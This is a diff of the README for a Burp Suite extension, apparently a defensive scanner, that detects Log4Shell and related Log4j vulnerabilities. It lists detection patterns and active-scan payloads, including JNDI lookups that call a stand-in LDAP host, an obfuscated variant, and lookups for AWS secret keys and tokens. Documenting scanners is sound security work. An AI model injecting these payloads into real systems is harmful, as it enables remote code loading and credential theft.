@@ -1,13 +1,16 @@
-# Burp Suite Extension for CVE and Log4j Checking
+# Enhanced CVE and Log4j Checker
 By @CadGoose
 
 ## Overview
-This Burp Suite extension is designed to check for specific CVEs and Log4j-related vulnerabilities in HTTP, HTTPS, and WebSocket responses during passive and active scans. The current implementation focuses on detecting CVE-2021-44228 (Log4Shell) and other Log4j-related vulnerabilities.
+The **Enhanced CVE and Log4j Checker** is a Burp Suite extension designed to identify specific CVEs and Log4j-related vulnerabilities in HTTP, HTTPS, and WebSocket responses. This extension performs both passive and active scans, provides detailed issue reports, and allows users to export vulnerability data for further analysis.
 
 ## Features
 - **Passive Scan**: Automatically scans HTTP, HTTPS, and WebSocket responses for specific CVEs and Log4j patterns.
-- **Active Scan**: Injects payloads into HTTP requests and analyzes responses to detect vulnerability exploitation.
+- **Active Scan**: Injects payloads into HTTP requests and analyzes responses to detect exploit attempts.
 - **Custom Alerts**: Provides detailed issue reports when potential vulnerabilities are detected.
+- **Logging**: Maintains a log of detected vulnerabilities with timestamps.
+- **Exportable Reports**: Users can export detected issues to a JSON file for easy sharing and integration with other tools.
+- **User Interface**: Includes a custom UI panel in Burp Suite for managing the extension and exporting reports.
 
 ## Prerequisites
 - **Burp Suite**: Professional or Community Edition
@@ -29,8 +32,41 @@ This Burp Suite extension is designed to check for specific CVEs and Log4j-relat
    - The extension will start scanning for the specified CVEs and Log4j patterns when passive scanning HTTP, HTTPS, and WebSocket responses.
    - For active scanning, the extension will inject payloads and analyze responses to detect exploit attempts.
 
-2. **Review Scan Results**:
+2. **View and Export Scan Results**:
    - Detected issues will be listed in the Scanner tab under Issues.
+   - To export the report, go to the "CVE Checker" tab and click the "Export Report" button to save the report as a JSON file.
+
+## Detection Details
+### Passive Scanning
+- **Log4Shell Patterns**:
+  - `${jndi:ldap://`
+  - `${jndi:rmi://`
+  - `${jndi:ldaps://`
+  - `${jndi:dns://`
+  - `${jndi:iiop://`
+  - `${jndi:corba://`
+  - `${jndi:nds://`
+  - `${jndi:nis://`
+  - `${jndi:rfc://`
+
+- **Other Log4j-Related Patterns**:
+  - `${sys:os.name}`
+  - `${env:}`
+  - `${sys:}`
+  - `${env:AWS_SECRET_ACCESS_KEY}`
+  - `${java:version}`
+  - `${java:os}`
+  - `${env:AWS_SESSION_TOKEN}`
+  - `${env:AWS_ACCESS_KEY_ID}`
+  - `${main:ARGS}`
+
+### Active Scanning
+- **Payloads Injected**:
+  - `${jndi:ldap://example.com/a}`
+  - `${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.com/a}`
+  - `${sys:os.name}`
+  - `${env:AWS_SECRET_ACCESS_KEY}`
+  - `${java:version}`
 
 ## Disclaimer
 This tool is intended for educational purposes and should be used responsibly. Ensure you have appropriate permissions before scanning any network or application.
